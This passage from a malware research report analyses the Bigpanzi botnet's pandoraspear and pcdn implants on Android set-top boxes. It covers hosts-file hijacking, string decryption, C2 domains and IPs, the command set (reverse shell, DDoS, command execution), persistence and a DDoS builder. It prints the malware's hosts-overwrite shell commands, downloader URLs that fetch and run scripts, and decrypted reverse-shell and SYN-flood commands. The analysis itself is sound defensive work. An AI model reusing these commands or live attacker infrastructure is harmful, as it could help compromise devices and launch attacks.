reveals part of the hosts file. In this decrypted segment, it's observable that the C2 domain names we hijacked are redirected to pandoraspear's own C2 IP, 71.19.252.13.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_c2sxlab.png" class="kg-image" alt="pan_c2sxlab.png" loading="lazy"></figure><p>Once the /data/.hosts file is decrypted, the following commands are used to overwrite the system's /etc/hosts file:</p><pre><code># 1:enable write

/system/xbin/busybox mount -o rw,remount /dev/block/system /system
mount -o rw,remount /dev/block/system /system
mount -o rw,remount /

# 2:replace /etc/hosts
/system/xbin/busybox cp -ar /data/.hosts /etc/hosts &amp;&amp; chmo d 644 /etc/hosts &amp;&amp; busybox rm -rf /data/.hosts
/vendor/xbin/busybox cp -ar /data/.hosts /etc/hosts &amp;&amp; chmo d 644 /etc/hosts &amp;&amp; busybox rm -rf /data/.hosts

# 3: disable write
/system/xbin/busybox mount -o ro,remount /dev/block/system /system
mount -o ro,remount /dev/block/system /system</code></pre><h2 id="q-why-does-pandoraspear-hijack-hosts-files">Q: Why does pandoraspear hijack HOSTS files?</h2><p>Hijacking the HOSTS file is not an overly sophisticated technique, but when used effectively, it can have significant effects. We believe pandoraspear hijacks HOSTS files for the following three purposes:</p><ol><li><strong>Traditional Malicious Intentions</strong>: This includes website blocking, evasion of intrusion detection systems, information theft, and phishing. By redirecting traffic to different domains, pandoraspear can manipulate the user's web experience and intercept or redirect data for malicious purposes.</li><li><strong>Protecting Its Own Assets</strong>: In cases where C2 (Command and Control) or other important operational domains are hijacked or sinkholed, modifying the HOSTS file can help regain control. This is a direct method to redirect traffic to a new domain controlled by the attackers, even if the original domain is compromised.</li><li><strong>Facilitating Operational Management</strong>: As a long-standing cybercrime operation, the group might use certain domains for short-term operations or testing. By using the HOSTS file to redirect traffic, there is no need to formally register these domains, thus reducing operational costs. This can be especially useful for temporary or experimental campaigns, allowing for quick changes without the need to manage domain registrations and DNS records.</li></ol><h2 id="12-launching-pcdn-reporting-device-status">1.2 Launching Pcdn &amp; Reporting Device Status</h2><p>Pandoraspear initiates two key tasks, <code>runpcdn</code> and <code>report_status</code>, through <code>thpool_add_work</code>. The former is responsible for starting the pcdn process, while the latter is tasked with reporting the status of the compromised device to the Command and Control (C2) server.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pando_task.png" class="kg-image" alt="pando_task.png" loading="lazy"></figure><p>In both of these functions, pandoraspear employs a novel encryption method to protect sensitive strings. This approach is designed to prevent the immediate revelation of its functionalities through straightforward analysis.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pando_decstr.png" class="kg-image" alt="pando_decstr.png" loading="lazy"></figure><p>The following is an equivalent Python implementation of the code depicted in the above diagram.</p><pre><code>def decbuf(buf):
    
    leng=buf[0]^buf[1]^buf[2]
    out=''
    for i in range(3,leng+3):
        tmp=((buf[i]^buf[1])-buf[1])&amp;0xff
        out+=chr((tmp^buf[0]))
    print(out)</code></pre><p>Taking the ciphertext in <strong>runpcdn</strong> as an example.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_runb.png" class="kg-image" alt="pan_runb.png" loading="lazy"></figure><p>After decryption</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_runa.png" class="kg-image" alt="pan_runa.png" loading="lazy"></figure><p></p><p>In fact, <code>runpcdn</code> merely employs the <code>sprintf</code> function to assemble the strings shown in the diagram into a script. This script is then executed using the <code>system</code> function. Its purpose is to ascertain whether the <code>pcdn</code> process is active on the system. If it's not, the script initiates either <code>/system/bin/pcdn</code> or <code>/data/.pcdn</code>.</p><pre><code>#!/system/bin/sh
pid=`ps|grep -v grep|grep "/system/bin/pcdn" |awk '{print $2}'`
if [ -z $pid ];then
/system/bin/pcdn &gt;/dev/null 2&gt;&amp;1 &amp;
or
/data/.pcdn &gt;/dev/null 2&gt;&amp;1 &amp;
fi</code></pre><h2 id="13-c2-communication">1.3 C2 Communication<br></h2><p>Pandoraspear establishes communication with its Command and Control (C2) servers in a specific order. In versions before v6, all three of the following methods were supported, but from version v7 onwards, only the last two are supported:</p><ol><li><strong>Command Line Specified</strong>: The C2 server is specified via command-line arguments.</li><li><strong>/data/.ms File</strong>: The C2 server information is stored in an encrypted form in this file.</li><li><strong>Hardcoded in the Sample</strong>: The C2 server is hardcoded within the malware sample.</li></ol><p>It's important to note that the C2 information in the /data/.ms file is encrypted and the decryption method is the same as that used for the hosts file. </p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_spear_ms.png" class="kg-image" alt="pan_spear_ms.png" loading="lazy"></figure><p>If the C2 from the /data/.ms file fails, pandoraspear defaults to using the hardcoded C2.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pando_c2.png" class="kg-image" alt="pando_c2.png" loading="lazy"></figure><p>According to Dr.Web's analysis, it was initially believed that there were only four C2 servers, but this is an understatement. In reality, there are four groups of C2 servers, each group containing three servers, making a total of nine unique C2 servers after deduplication.</p><pre><code>ok3.mf1ve.com
ok3.mflve.com
abcr.ftsym1.com
pcn.panddna.com
ppn.pnddon.com
apz.bsaldo.com
apz.pdonno.com
jgp.pdltdgie.com
romatotti520.xxxxx (mask)</code></pre><p>Once pandoraspear obtains a C2 address using any of the above methods, it attempts to establish communication with the C2 server's port 9999 and sends encrypted device information to signal that it's online. The source of the device information depends on whether the serial number can be successfully read:</p><ol><li><strong>Successful Serial Number Retrieval</strong>: If the serial number is successfully obtained, it's concatenated with the device's country, city, ISP, and other information to form the device information (Format 2).</li><li><strong>Serial Number Retrieval Failure</strong>: If the serial number cannot be read, the device's MAC address is used instead (Format 1).</li></ol><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pando_format.png" class="kg-image" alt="pando_format.png" loading="lazy"></figure><p>The online information communicated by pandoraspear to the C2 server uses the same encryption method as that employed for the hosts file. By examining two actual online packets received by the sinkhole server, and decrypting their content, we can validate the previous analysis. In the decrypted content, "1000" denotes an online status signal, and "0008", "0010" represent the version numbers of the malware.</p><ul>
<li>
<p>format 1</p>
<pre><code>2Sk28.BdtyL19pbXp.MWRJC1dnVSR1HVx041cj2M10PhgOU1f5qPA0zCT/c/
# decryption
1000@12.002C:DD:5F:07:85:48@0010@19805@\x00
</code></pre>
</li>
<li>
<p>format 2</p>
<pre><code>GYQL4.o/a6t00O0Tr/gnAwg1yShGO0/cuPb.iqo9T073FpJ/sIk3q.oCJJz.VLr5K1vRpsW.pQhuT1vo6W31Q0g/h0OilPe.Swr2C0MKukK0Nokko0Q1I7l/yrCMv.GmGlu0oNPl7/R7/fi0wwZcC.yH.6F/tjiKO11z16i.

#decryption
1000@1a.01-22.10-22137263@0008@8367@193d3d@BR@Braganca Paulista@Redenilf Servi\xc3\xa7os de Telecomunica\xc3\xa7\xc3\xb5es Ltda@\x00\x00
</code></pre>
</li>
</ul>
<p>For instance, considering the online requests monitored by a sinkhole on October 13th, the comparison between version numbers and the number of requests is illustrated in the table below, indicating that versions 8, 9, and 10 are the most prevalent at present.</p><table>
<thead>
<tr>
<th>Version</th>
<th>Request Count</th>
</tr>
</thead>
<tbody>
<tr>
<td>0010</td>
<td>992537</td>
</tr>
<tr>
<td>0008</td>
<td>175722</td>
</tr>
<tr>
<td>0009</td>
<td>46178</td>
</tr>
<tr>
<td>0007</td>
<td>12397</td>
</tr>
<tr>
<td>0005</td>
<td>9360</td>
</tr>
<tr>
<td>0006</td>
<td>4785</td>
</tr>
<tr>
<td>0004</td>
<td>3264</td>
</tr>
</tbody>
</table>
<p></p><h2 id="14-commands">1.4 Commands<br></h2><p>Once online, pandoraspear begins to await commands issued by the C2 (Command and Control) server. These commands are encrypted in the same manner as the hosts file, and once decrypted, their format appears as <code>cmd@cmd_item1@cmd_item2@...@</code>. Through tracking, over 100,000 such commands have been received, with recent ones including:</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pando_cmd-1.png" class="kg-image" alt="pando_cmd.png" loading="lazy"></figure><p>Based on the format of the commands, we can discern that in the diagram above, the numbers 88, 5000, and 6269 represent different commands. But what are their functions? Specifically, <strong>88 initiates a reverse shell, 5000 specifies the C2 server via /data/.ms, and 6269 executes a command</strong>. Beyond these, pandoraspear also supports commands for DDoS, self-updating, and more. For a comprehensive list of additional commands and their respective functions, please refer to the table below.</p><h2 id="v1-v2-cmds">v1 &amp; v2 Cmds</h2>
<!--kg-card-begin: html-->
<table>
<thead>
<tr>
<th>Cmd</th>
<th>Descrption</th>
</tr>
</thead>
<tbody>
<tr>
<td>11</td>
<td>Add dns via /etc/hosts</td>
</tr>
<tr>
<td>12</td>
<td>Del dns via /etc/hosts</td>
</tr>
<tr>
<td>21</td>
<td>Download new version to /koocan/savebin, update</td>
</tr>
<tr>
<td>31-38</td>
<td>Pandoraspear ddos vectors: syn,upd,icmp,mix,smurf,tagr3,cc,dnsflood</td>
</tr>
<tr>
<td>88</td>
<td>Reverse shell</td>
</tr>
<tr>
<td>110</td>
<td>Stop ddos</td>
</tr>
<tr>
<td>3000</td>
<td>Write new c2 to /data/.ms, and connect to the server</td>
</tr>
<tr>
<td>5000</td>
<td>Write new c2 to /data/.ms</td>
</tr>
<tr>
<td>5555</td>
<td>Repalce c2 in /data/.ms with new c2</td>
</tr>
<tr>
<td>6269</td>
<td>Execute cmd</td>
</tr>
</tbody>
</table>
<!--kg-card-end: html-->
<h2 id="v4-v10-cmds">v4-v10 Cmds</h2><p>Versions subsequent to v4 (or v3) support all commands from v1 and v2, and introduce some new features. Among the most notable is the inclusion of support for Mirai attack vectors.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_mirai.png" class="kg-image" alt="pan_mirai.png" loading="lazy"></figure><table>
<thead>
<tr>
<th>Cmd</th>
<th>Descrption</th>
</tr>
</thead>
<tbody>
<tr>
<td>39</td>
<td>11 mirai ddos vectors</td>
</tr>
<tr>
<td>200</td>
<td>Check if the MD5 of a file matches the provided MD5 and return the result to C2</td>
</tr>
<tr>
<td>201</td>
<td>Similar with 200, but if not match, download the provided MD5</td>
</tr>
<tr>
<td>4000</td>
<td>Add a new task into threadpool: Download and decrypted the freeze hosts, add new iptbales rules to drop the traffic related with freeze hosts</td>
</tr>
<tr>
<td>4001</td>
<td>Exec iptables -D INPUT %d ，delete the specific rule</td>
</tr>
<tr>
<td>4004</td>
<td>Add a new task into threadpool: Execute cmd return result to C2</td>
</tr>
<tr>
<td>4007</td>
<td>write info into /dec/block/hide(offset 0x2800 or 0x2c00)</td>
</tr>
</tbody>
</table>
<h2 id="15-communication-experiment">1.5 Communication Experiment<br></h2><p>To validate the accuracy of the analysis, a communication experiment was conducted. The setup involved creating a file <code>/data/.ms</code> on a test device containing the IP address of a test server set up as a fake C2 (Command and Control) server. When the fake C2 received an online packet, it issued a reverse shell command and a SYN flood command. The encrypted and decrypted forms of these commands were as follows:</p><h3 id="test-device-configuration"><strong>Test Device Configuration:</strong></h3><ul><li><code>/data/.ms</code> content:<ul><li>Encrypted: <code>jTyzJ0Jsy9J0.dlr6.kpjwj1</code></li><li>Decrypted: <code>45.14.106.78</code></li></ul></li></ul><h3 id="test-server-configuration"><strong>Test Server Configuration:</strong></h3><ul><li>Fake C2 listening on port 9999, netcat (nc) listening on port 12345.</li></ul><h3 id="reverse-shell-command"><strong>Reverse Shell Command:</strong></h3><ul><li>Encrypted: <code>S6uhZ0bk5OR/2GoxK1ddQhJ1zMcR3//8TkY/</code></li><li>Decrypted: <code>88@45.14.106.78@12345@\x00\x00</code></li></ul><h3 id="syn-flood-command"><strong>SYN Flood Command:</strong></h3><ul><li>Encrypted: <code>o4Bmz/HksdL12GoxK1ddQhJ1DJ8g8.GoiiS1</code></li><li>Decrypted: <code>31@45.14.106.78@8888@\x00\x00\x00</code></li></ul><p>Upon receiving these commands, the test device attempted to establish a reverse shell connection with <code>45.14.106.78:12345</code> and launched a SYN flood attack against <code>45.14.106.78:8888</code>. The actual results corroborated the analysis.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_rshell.png" class="kg-image" alt="pan_rshell.png" loading="lazy"></figure><p>The pcap (packet capture) file from the experiment likely showed that the source addresses in the SYN flood attack were spoofed. </p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_synflood.png" class="kg-image" alt="pan_synflood.png" loading="lazy"></figure><p>This method is an outdated technique for SYN attacks, and many modern data centers implement source address validation, significantly reducing the effectiveness of such attacks. Indeed, the DDoS attack methods embedded in pandoraspear are somewhat dated and not highly effective, which may explain why the Bigpanzi group started incorporating more efficient attack vectors like those from Mirai in versions v4 (or v3) of their malware.</p><h2 id="16-gifts-from-command-tracking">1.6 Gifts From Command Tracking</h2><p>The analysis of pandoraspear represents the first step in understanding the Bigpanzi cybercrime group. This analysis not only reveals the existence of a large-scale botnet operating in the wild but also raises new questions about the scope and nature of the threat posed by Bigpanzi. Key questions include the types of devices targeted by pandoraspear, how it spreads, and whether the group behind it has developed other malicious implants.</p><p>In the course of a deeper investigation into this group, several downloader URLs were discovered in the tracked commands. </p><pre><code>http://fadfatest.pneydn.com:8080/stb-download/tool/a.sh
http://fadfatest.pneydn.com:8080/stb-download/tool/na.sh
</code></pre>
<p>These URLs primarily serve to download and execute scripts like <code>pd.sh</code> and <code>cpdn.sh</code>. The <code>pd.sh</code> script is associated with pandoraspear, </p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pando_na.png" class="kg-image" alt="pando_na.png" loading="lazy"></figure><p>while <code>cpdn.sh</code> corresponds to a new implant named <code>pcdn</code>.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pando_pcdn.png" class="kg-image" alt="pando_pcdn.png" loading="lazy"></figure><p>This discovery indicates that pandoraspear does not operate in isolation; it appears alongside <code>pcdn</code>. Beyond <code>pcdn</code>, other implants such as <code>ptcrack</code>, <code>play_station</code>, and <code>p2p_peer</code> were also detected. These implants share a common download URL pattern of <code>/std-download/tool/</code>, which was instrumental in confirming the method of device infection discussed earlier.</p><h1 id="0x02-pcdn-analysis">0x02: Pcdn Analysis</h1><p>We captured five samples of pcdn, which, unlike the continuously updated pandoraspear, has been relatively stable. The latest modification date for pcdn is pinned to August 2021, with an MD5 hash of 7ccdaa9aa63114ab42d49f3fe81519d9. </p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pcdn_lastmod.png" class="kg-image" alt="pcdn_lastmod.png" loading="lazy"></figure><p>Pcdn's functionalities can be summarized into two main categories:</p><ol><li><strong>Building a Streaming Media Platform</strong>: The primary function of pcdn is to set up a streaming media platform on the infected device. It uses the Peer-to-Peer (P2P) protocol to network numerous infected devices, forming a P2P-like Content Distribution Network (CDN). This is hinted at by the file name pcdn itself, which implies 'P2P CDN'. Pcdn is suitable for various applications such as video on demand, live streaming, replay, and downloading large files. We speculate that the Bigpanzi group utilizes Pandora-CDN for streaming pirated videos and downloading related APKs.</li><li><strong>Weaponizing Devices</strong>: The secondary function of pcdn involves "weaponizing" the infected devices. It executes commands issued by the C2 server, including conducting Distributed Denial of Service (DDoS) attacks. This aspect of pcdn turns regular devices into tools for cyber attacks, expanding the operational scope of the Bigpanzi group.</li></ol><h2 id="21-decryption">2.1 Decryption<br></h2><p>For pcdn, sensitive strings related to its two main functionalities are encrypted and stored in the data segment. The encryption method used is the same as that of pandoraspear. </p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pcdn_data_enc.png" class="kg-image" alt="pcdn_data_enc.png" loading="lazy"></figure><p>To facilitate reverse engineering, a decryption script was implemented. (However, it's important to note that the script is not perfect; manual patching is required at addresses 0x00057A3E and 0x00057BF6). </p><pre><code>def decbuf(buf):
    
    leng=buf[0]^buf[1]^buf[2]
    out=''
    for i in range(3,leng+3):
        tmp=((buf[i]^buf[1])-buf[1])&amp;0xff
        out+=chr((tmp^buf[0]))
    return out
        
data=ida_segment.get_segm_by_name('.data')
start=data.start_ea
buf=ida_bytes.get_bytes(start,data.size())
tmp=buf.split(b'\x00')

items=[]
for i in tmp:
    if len(i) &gt;3 and i[0]^i[1]^i[2]==len(i)-3:
        items.append(i)


for item in items:
    i = ' '.join(f'{byte:02X}' for byte in item)
    offset=idc.find_binary(start,idaapi.SEARCH_DOWN,i)
    plain=decbuf(item).encode()
    print(hex(offset),plain)
    ida_bytes.patch_bytes(offset+3,plain)
    idc.create_strlit(offset+3,offset+len(item))
</code></pre>
<p>After decrypting the data segment, you would be able to view and analyze the previously encrypted strings.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pcdn_data_dec.png" class="kg-image" alt="pcdn_data_dec.png" loading="lazy"></figure><h2 id="22-persistence">2.2 Persistence<br></h2><p>Pcdn achieves persistence on the infected device through the use of scripts such as <code>init.amlogic.board.rc</code>, <code>lowmem_manager.sh</code>, or <code>set_display_mode.sh</code>. The logic for achieving persistence is as follows:</p><ul><li>If there is already a persistence command in <code>init.amlogic.board.rc</code> (like <code>service pcdn /system/bin/pcdn</code>), then pcdn will rename <code>/data/pcdn</code> to <code>/data/.pcdn</code> and copy it to <code>/system/bin/pcdn</code>. After this, it clears any persistence commands from <code>lowmem_manage.sh</code> and <code>set_display_mode.sh</code> that involve <code>/system/bin/pcdn&amp;</code>.</li><li>Conversely, if there isn’t a persistence command in <code>init.amlogic.board.rc</code>, pcdn copies <code>/data/pcdn</code> to <code>/system/bin/pcdn</code> and then adds a persistence command <code>/system/bin/pcdn&amp;</code> to <code>lowmem_manage.sh</code> and <code>set_display_mode.sh</code>.</li></ul><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pcdn_persist.png" class="kg-image" alt="pcdn_persist.png" loading="lazy"></figure><h2 id="23-building-the-pcdn-network">2.3 Building the PCDN Network</h2><p>PCDN turns a device into a functional node in the CDN network via these steps</p><h3 id="1-registering-the-node-with-pandora-cdn-center">1: Registering the Node with Pandora-CDN Center</h3>
<p>pcdn utilizes the serial number of the device, which it obtains from one of the devices located at /dev/block/hide, /dev/block/mtdblock4, or /dev/block/mtdblock5. It uses this serial number to register the node with the Pandora-CDN center. The pcdn samples have two central domain names hardcoded for this purpose.</p>
<pre><code>
pcdnbus.ou2sv.com
pcdnbus-bk.a2k3v.com</code></pre><p>The resulting network traffic is shown below:</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pcdn_reg.png" class="kg-image" alt="pcdn_reg.png" loading="lazy"></figure><h3 id="2-port-mapping">2: Port Mapping<br></h3><p>Pcdn implements port mapping using the Universal Plug and Play (UPnP) protocol. A distinctive feature of this process is the use of "NewPortMappingDescription" with the value set to "PCDN_H". This characteristic serves as an identifier for the port mapping activities specifically related to PCDN. Additionally, it's important to note that all the ports depicted in the following diagram are dedicated to PCDN operations.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pcdn_map.png" class="kg-image" alt="pcdn_map.png" loading="lazy"></figure><h4 id="3-downloading-required-toolkits-and-executing-scripts-to-start-services">3 : Downloading Required Toolkits and Executing Scripts to Start Services<br></h4><p>Pcdn downloads the necessary toolkit for PCDN operation through a thread named <code>thread_setup_pcdn_tookit</code>. </p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pcdn_thread.png" class="kg-image" alt="pcdn_thread.png" loading="lazy"></figure><p>The logic of <code>thread_setup_pcdn_toolkit</code> is relatively straightforward:</p><ul><li>The script first checks if certain files or directories exist in the system, such as <code>/data/srs.sh</code>, <code>/data/p2p/play_station</code>, or the <code>/data/kcptun</code> directory.</li></ul><pre><code>if [ ! -f "/data/srs.sh" ];then ...
if [[ ! -f "/data/p2p/play_station" ]] &amp;&amp; [[ ! -f "/system/bin/play_station" ]] then...
if [ ! -d "/data/kcptun" ] then...
</code></pre>
<ul><li>If these are not present, it then downloads the respective toolkit files - <code>pcdn.tar.gz</code>, <code>play.gz</code>, <code>ktptun.gz</code> - from a remote server (either <code>fadfa.dyanoe.com:8080</code> or <code>50.7.118.114:19091</code>). These files are subsequently unzipped into the <code>/data</code> directory. It’s worth noting that the files extracted from <code>play.gz</code> and <code>kcptun.gz</code> are actually part of what is contained in <code>pcdn.tar.gz</code>.</li></ul><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pcdn_targz.png" class="kg-image" alt="pcdn_targz.png" loading="lazy"></figure><ul><li>Finally, the script checks if the relevant component processes are running in the system. If not, it starts the necessary components. </li></ul><pre><code>#!/system/bin/sh
pid=`ps|grep -v grep|grep "%s"|awk '{print $2}'`
if [ -z $pid ];then
%s
fi
</code></pre>
<p>The component name is inserted in place of the first <code>%s</code>, and the command to start the component is placed in the second <code>%s</code>.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pcdn_toolkit.png" class="kg-image" alt="pcdn_toolkit.png" loading="lazy"></figure><h3 id="4-components-related-to-pandora-cdn">4: Components Related to Pandora-CDN<br></h3><p>The file list within <code>pcdn.tar.gz</code> includes several key components, each serving a specific purpose within the Pandora-CDN framework:</p><ul><li><strong>Streaming Media Server</strong>: In the <code>evlls</code> directory, <code>srs</code> is a streaming media server supporting protocols like RTMP, HLS, and HTTP-FLV.</li><li><strong>Network Acceleration</strong>: The <code>kcp</code>/<code>kcptun</code> directory contains components related to network acceleration.</li><li><strong>Shadowsocks Service</strong>: Components in the <code>ss</code> directory are related to the Shadowsocks service.</li><li><strong>P2P Networking</strong>: The <code>p2p</code> directory contains <code>p2p_peer</code>, which is related to networking among peers.</li><li><strong>Video Services</strong>: The <code>play_station</code> is associated with video-related services.</li></ul><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pcdn_details.png" class="kg-image" alt="pcdn_details.png" loading="lazy"></figure><p>The various ports mentioned in the previous section about port mapping are also configured in the configuration files of these components. For example, ports 8337 and 8388 are mentioned in the <code>server-multi-port.json</code>.</p><pre><code>{
	"port_password": {
		"8387": "foobar",
		"8388": "barfoo"
	},
	"method": "aes-128-cfb",
	"timeout": 600
}
</code></pre>
<p>In summary, pcdn utilizes open-source software like srs, ss, and kcp to transform the infected devices into SRS edge nodes and SS proxy servers. The use of KCP (Kernel Control Path) acceleration ensures the quality of service, enhancing the user experience for streaming media. The detailed business scenarios of Pandora-CDN involve many components and, due to space constraints, this article will not delve into these in detail. Further analysis of these components will be provided in a subsequent article.</p><h3 id="0x5-http-server">0x5: HTTP Server<br></h3><p>Pcdn sets up an HTTP server that listens on the local TCP port 19906. This server provides an HTTP service accessible via the path <code>/getsatus</code>. The service supports a <code>mode</code> query parameter, which can take values such as <code>app</code>, <code>p2p</code>, <code>auth</code>, and <code>portmapping</code>. </p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pcdn_http.png" class="kg-image" alt="pcdn_http.png" loading="lazy"></figure><p>This HTTP service is utilized by components like <code>play_station</code> and <code>punshHoleClient</code> to query the status of the infected device.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pan_punshHole.png" class="kg-image" alt="pan_punshHole.png" loading="lazy"></figure><h2 id="24-device-weaponization">2.4 Device "Weaponization"</h2><p>In pcdn, there are three threads responsible for Distributed Denial of Service (DDoS) related tasks:</p><ol><li><strong>dropstimetask</strong>: Manages time scheduling.</li><li><strong>dropstask</strong>: Handles communication with the Command and Control (C2) server, including receiving instructions.</li><li><strong>dropsinittask</strong>: Executes the DDoS attacks as instructed.</li></ol><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pcdn_droptask.png" class="kg-image" alt="pcdn_droptask.png" loading="lazy"></figure><p>In the dropstask, five hardcoded C2 servers are specified, all using port 31226 (0x79fa).</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pcdn_c2s.png" class="kg-image" alt="pcdn_c2s.png" loading="lazy"></figure><p><strong>Interaction Process Between the Bot and C2:</strong></p><ul><li><strong>C2 to Bot</strong>: Issues an XOR key (4 bytes).</li><li><strong>Bot to C2</strong>: Encrypts and sends device information such as the serial number (SN) using the XOR key (38 bytes).</li><li><strong>C2 to Bot</strong>: Confirms that the bot is online (12 bytes).</li><li><strong>C2 to Bot</strong>: Sends commands to the bot.</li></ul><p>The dropsinittask, upon receiving commands from the C2 server, selects the appropriate ddos_vector to carry out DDoS attacks. </p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pcdn_doscode.png" class="kg-image" alt="pcdn_doscode.png" loading="lazy"></figure><p>Pcdn supports the following eight types of attack vectors:</p><table>
<thead>
<tr>
<th>dicmptask</th>
<th>dudptask</th>
</tr>
</thead>
<tbody>
<tr>
<td>dsyntask</td>
<td>dtcptask</td>
</tr>
<tr>
<td>dkeeptask</td>
<td>dhttptask</td>
</tr>
<tr>
<td>dposttask</td>
<td>ddiy01task</td>
</tr>
</tbody>
</table>
<h2 id="25-gifts-from-pcdn">2.5 Gifts from Pcdn</h2><p>By tracing the strings related to <code>dropstimetask</code>, <code>dropstask</code>, and <code>dropsinittask</code> within pcdn, we successfully located two Windows-based Distributed Denial of Service (DDoS) tools named <code>Fl00d</code> and <code>Fl00d 2.0</code>.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_dlist.png" class="kg-image" alt="pan_dlist.png" loading="lazy"></figure><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pan_ddoskits.png" class="kg-image" alt="pan_ddoskits.png" loading="lazy"></figure><h1 id="0x03-analysis-of-ddos-tools">0x03: Analysis of DDoS Tools</h1><p>Taking <code>Fl00dce690167abeee4326d5369cceffadaaf</code> as an example, this tool is identified as a DDoS Builder. </p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_ddostool.png" class="kg-image" alt="pan_ddostool.png" loading="lazy"></figure><p>Its operational interface, accessible upon running the program, features a 'slave' button which, when clicked, opens a dialog box for configuration. This configuration process facilitates the generation of bot samples compatible with three platforms: STB (Set-Top Box), Linux, and Windows.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_bot.png" class="kg-image" alt="pan_bot.png" loading="lazy"></figure><p>A Linux64 sample generated with the default configuration of this DDoS Builder has an MD5 hash of <code>d6285261d6b2d0a26d186e1b831664db</code>. Analysis with IDA reveals numerous strings related to "drops" and "task",</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pan_ddosbot.png" class="kg-image" alt="pan_ddosbot.png" loading="lazy"></figure><p>indicating a clear lineage between this tool's code and the DDoS-related code found in pcdn.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pcdn_dstr.png" class="kg-image" alt="pcdn_dstr.png" loading="lazy"></figure><p>While pandoraspear and pcdn possess DDoS functionalities, there was initially doubt about the group's involvement in DDoS activities as no actual attack commands were tracked. However, the discovery of this DDoS Builder tool, coupled with the observed pattern of DDoS attacks initiated upon the resolution of hijacked C2 domain names, confirms the group's long-term engagement in unlawful DDoS activities.</p><p>The absence of tracked attack commands might be due to the group shifting focus as their operations expanded. For instance, content business lines involving Android TV and STBs may have become more profitable, making these high-value assets. Consequently, the group might have redirected DDoS activities to other botnets within their control, preserving the more valuable resources for content distribution and other lucrative operations. This strategic shift underscores the adaptability and evolving nature of cybercrime syndicates like Bigpanzi.</p><h2 id="gifts-from-the-ddos-builder">Gifts from the DDoS Builder</h2><p>As mentioned in the "Infection Methods" section, through the C2 (Command and Control) servers associated with the DDoS Builder, we were able to locate 325 instances of "SmartUpTool" firmware. Out of these, 32 contained the specific string "ddiy01task" embedded within them, and all of these instances were firmware for the eCos system.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pan_smartddiy.png" class="kg-image" alt="pan_smartddiy.png" loading="lazy"></figure><p>Among these 32 firmware instances identified, some share Fully Qualified Domain Names (FQDNs) that belong to the same Second-Level Domain (SLD) as the domain names used by the DDoS Builder.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pan_conditionC.png" class="kg-image" alt="pan_conditionC.png" loading="lazy"></figure><p>Within these 32 firmware instances, there are strings related to DDoS Tasks &amp; Vectors that are identical to those found in pcdn.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pan_conditionB.png" class="kg-image" alt="pan_conditionB.png" loading="lazy"></figure><p>Within these 32 firmware instances, there are 5 domains resolving to the same IP address as the C2 for pcdn, specifically to 162.209.126.216.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pan_conditionA.png" class="kg-image" alt="pan_conditionA.png" loading="lazy"></figure><p>Additionally, the domain names used for the Command and Control (C2) servers in both batches exhibit very similar patterns.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pan_c2vt.png" class="kg-image" alt="pan_c2vt.png" loading="lazy"></figure><p>These events can't just be chalked up to coincidence anymore. Since users are complaining about strange traffic from their set-top boxes on forums, we think that Bigpanzi is targeting set-top box devices that run on the eCos platform.</p><figure class="kg-card kg-image-card"><img 